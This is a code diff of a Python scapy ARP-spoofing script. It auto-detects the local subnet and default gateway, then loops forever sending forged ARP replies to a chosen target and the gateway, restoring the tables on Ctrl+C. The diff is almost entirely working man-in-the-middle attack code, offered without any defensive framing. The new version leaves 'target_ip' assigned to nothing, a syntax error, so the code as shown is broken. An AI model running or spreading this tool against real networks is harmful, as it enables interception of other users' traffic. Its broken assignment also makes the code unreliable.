@@ -2,13 +2,19 @@ from scapy.all import Ether, ARP, srp, send, conf, get_if_addr
 import scapy.all as scapy
 import time
 import ipaddress
+import netifaces
 
-def get_network_range(ip_address):
+
+
+def get_network_range():
+    self_ip = get_if_addr(conf.iface)
     # Get the subnet mask based on the IP address
-    network = ipaddress.ip_interface(ip_address+'/24')
+    network = ipaddress.ip_interface(self_ip+'/24')
     network_range = set(str(ip) for ip in network.network.hosts())
-    print(network)
+    # print(network_range)
     return network_range
+
+
 def get_mac(ip):
 	arp_request = scapy.ARP(pdst = ip)
 	broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
@@ -29,20 +35,27 @@ def restore(destination_ip, source_ip):
 	scapy.send(packet, verbose = False)
 	
 
-target_ip = "192.168.80.17" # Enter your target IP
-gateway_ip = "192.168.80.239" # Enter your gateway's IP
 
-try:
-	sent_packets_count = 0
-	while True:
-		spoof(target_ip, gateway_ip)
-		spoof(gateway_ip, target_ip)
-		sent_packets_count = sent_packets_count + 2
-		print("\r[*] Packets Sent "+str(sent_packets_count), end ="")
-		time.sleep(2) # Waits for two seconds
 
-except KeyboardInterrupt:
-	print("\nCtrl + C pressed.............Exiting")
-	restore(gateway_ip, target_ip)
-	restore(target_ip, gateway_ip)
-	print("[+] Arp Spoof Stopped")
+
+def main():
+    
+    gateways = netifaces.gateways()
+    gateway_ip = gateways['default'][netifaces.AF_INET][0]
+
+    target_ip =  # Enter your target IP
+    
+    try:
+        sent_packets_count = 0
+        while True:
+            spoof(target_ip, gateway_ip)
+            spoof(gateway_ip, target_ip)
+            sent_packets_count = sent_packets_count + 2
+            print("\r[*] Packets Sent "+str(sent_packets_count), end ="")
+            time.sleep(2) # Waits for two seconds
+
+    except KeyboardInterrupt:
+        print("\nCtrl + C pressed.............Exiting")
+        restore(gateway_ip, target_ip)
+        restore(target_ip, gateway_ip)
+        print("[+] Arp Spoof Stopped")
